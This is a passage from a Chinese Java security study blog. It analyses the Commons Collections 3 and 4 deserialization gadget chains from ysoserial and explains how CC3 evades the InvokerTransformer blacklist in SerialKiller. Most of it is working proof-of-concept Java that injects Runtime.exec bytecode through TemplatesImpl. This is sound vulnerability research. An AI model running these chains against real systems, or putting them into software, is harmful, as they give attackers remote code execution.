NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;CC4Evil&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetbyte = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = templates.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecodes = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(templates,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecodes.set(templates,targetbyte);<br>        _tfactory.set(templates,<span class="hljs-keyword">null</span>);<br><br>        Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        Class clazz1 = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field comparator = clazz1.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br>        <span class="hljs-keyword">try</span> &#123;<br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>            objectOutputStream.writeObject(priorityQueue);<br>            objectOutputStream.close();<br><br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>            objectInputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在查看&lt;code&gt;ysoserial&lt;/code&gt;里面的CommonsCollections4的利用链后，我个人感</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections3链分析学习</title>
    <link href="https://reader-l.github.io/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-16T07:07:38.000Z</published>
    <updated>2021-05-17T06:22:21.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    这篇文章是基于phith0n师傅在代码审计星球里的《Java安全漫谈系列》的第十四篇的文章来进行学习的。</p><h1 id="2-限制版本"><a href="#2-限制版本" class="headerlink" title="2.限制版本"></a>2.限制版本</h1><p><code>CommonsCollections 3.1 - 3.2.1</code></p><h1 id="3-限制的JDK版本"><a href="#3-限制的JDK版本" class="headerlink" title="3.限制的JDK版本"></a>3.限制的JDK版本</h1><p><code>JDK版本：1.7 （8u71之后已修复不可利用）</code></p><h1 id="4-分析"><a href="#4-分析" class="headerlink" title="4.分析"></a>4.分析</h1><p><code>CommonsCollections3</code>链其实是<code>CommonsCollections1</code>链和<code>CommonsCollections2</code>链的结合，为什么这样说呢？</p><p>往下看：以下是CC1链的核心代码和CC2中的核心代码</p><p>采用<code>TransformedMap</code>触发命令执行的CC1核心部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_cc1part</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC2中利用<code>TemplatesImpl</code>加载字节码的部分代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_cc2part</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass =  pool.makeClass(<span class="hljs-string">&quot;EvilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>尝试将这两部分组合起来，组成一个新的调用方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException, TransformerConfigurationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        <span class="hljs-comment">//参考cc1的简化Demo，调用newTransformer</span><br>        Transformer[] transform = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(obj),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transform);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = TransformedMap.decorate(innermap,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        outermap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br><span class="hljs-comment">//        obj.newTransformer();</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/2.png"></p><p>但是查看<code>ysoserial</code>工具的<code>cc3</code>利用链，我们可以发现该工具并不是利用这种方式。</p><p>原因如下：</p><p>​    2015年初，<code>@frohoff</code>和<code>@gebl</code>发布了Talk《Marshalling Pickles: how deserializing objects will ruinyour day》，以及Java反序列化利⽤⼯具<code>ysoserial</code>，随后引爆了安全界。开发者们⾃然会去找寻⼀种安全的过滤⽅法，于是类似<code>SerialKiller</code>这样的⼯具随之诞⽣。<code>SerialKiller</code>是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在其发布的第⼀个版本代码中，我们可以看到其给出了最初的⿊名单：</p><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/1.png"></p><p>​    这些工具增加了对CC1的核心类<code>InvokerTransformer</code>的防范，因此我们组合cc1和cc2链的新的调用方式是会被阻拦的，有攻就有防，<code>ysoserial</code>随后增加了不少新的Gadgets，其中就包括<code>CommonsCollections3</code>。<code>CommonsCollections3</code>的⽬的很明显，就是为了绕过⼀些规则对<code>InvokerTransformer</code>的限制。<code>CommonsCollections3</code>并没有使⽤到<code>InvokerTransformer</code>来调⽤任意⽅法，⽽是⽤到了另⼀个类，<code> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p><p>跟进这个类进行查看，发现它的构造函数存在该语句：<code>(TransformerImpl) templates.newTransformer()</code>，因此可以免去了我们使⽤<br><code>InvokerTransformer</code>⼿⼯调⽤<code> newTransformer()</code> ⽅法这⼀步。</p><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/3.png"></p><p>但是我们还是需要面对一个问题：缺少了<code>InvokerTransformer</code>，<code>TrAXFilter</code>的构造⽅法也是⽆法调⽤的。</p><p>这⾥yso的作者采取的解决的方式是：用到⼀个新的<code>Transformer</code>，就是<code>org.apache.commons.collections.functors.InstantiateTransformer </code>。<code>InstantiateTransformer</code>也是⼀个实现了Transformer接⼝的类，他的作⽤就是调⽤构造⽅法。</p><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/4.png"></p><p>因此现在的目标就是：利⽤ <code>InstantiateTransformer </code>来调⽤到 <code>TrAXFilter </code>的构造⽅法，再利⽤其构造⽅法⾥的 <code>templates.newTransformer() </code>调⽤到 <code>TemplatesImpl </code>⾥的字节码。</p><p>这样就比避免使用<code>InvokerTransformer</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>    <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_laster</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = TransformedMap.decorate(innermap,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        outermap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br><span class="hljs-comment">//        Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;);</span><br><span class="hljs-comment">//        Class.forName(&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;);</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/5.png"></p><h1 id="5-完整反序列化POC-1"><a href="#5-完整反序列化POC-1" class="headerlink" title="5.完整反序列化POC-1"></a>5.完整反序列化POC-1</h1><p>利用<code>TransformedMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span 